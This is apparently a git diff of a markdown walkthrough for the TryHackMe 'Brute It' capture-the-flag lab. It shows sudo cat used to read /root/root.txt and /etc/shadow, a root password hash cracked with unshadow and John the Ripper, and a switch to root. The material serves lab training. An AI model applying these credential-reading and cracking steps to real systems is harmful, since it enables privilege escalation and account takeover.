@@ -214,7 +214,7 @@ id_rsa:rockinroll
 Change the permissions of the private key with the following command
 chmod 600 id_rsa
                                       
-
+```
 
 SSH
 
@@ -266,32 +266,24 @@ User john may run the following commands on bruteit:
 
 ```
 https://gtfobins.github.io/gtfobins/cat/#sudo
+```
 
+```
 john@bruteit:~$ LFILE=/root/root.txt
 john@bruteit:~$ sudo /bin/cat "$LFILE"
 THM{pr1v1l3g3_3sc4l4t10n}
-
-
-```
-```
-john@bruteit:~$ nano run.sh
-
-contents of the file
-
-!/bin/bash
-
-ls -alt /root
-
-john@bruteit:~$ chmod +x run.sh
-
 ```
 
+
+
+Login as root user
 ```
 john@bruteit:~$ sudo /bin/cat /etc/passwd | head -n 1
 root:x:0:0:root:/root:/bin/bash
 john@bruteit:~$ sudo /bin/cat /etc/shadow | head -n 1
 root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
 ```
+
 ```
 └─# unshadow passwd.txt shadow.txt > unshadowed.txt
 
@@ -301,20 +293,18 @@ Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
 Cost 1 (iteration count) is 5000 for all loaded hashes
 Will run 2 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
+
 football         (root)     
+
 1g 0:00:00:01 DONE (2024-01-28 19:43) 0.9345g/s 119.6p/s 119.6c/s 119.6C/s 123456..diamond
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 
-john unshadowed.txt --show                
-root:football:0:0:root:/root:/bin/bash
-
-1 password hash cracked, 0 left
 
 john@bruteit:~$ su root
 Password: 
 root@bruteit:/home/john# whoami
 root
-
-
 ```
+
+
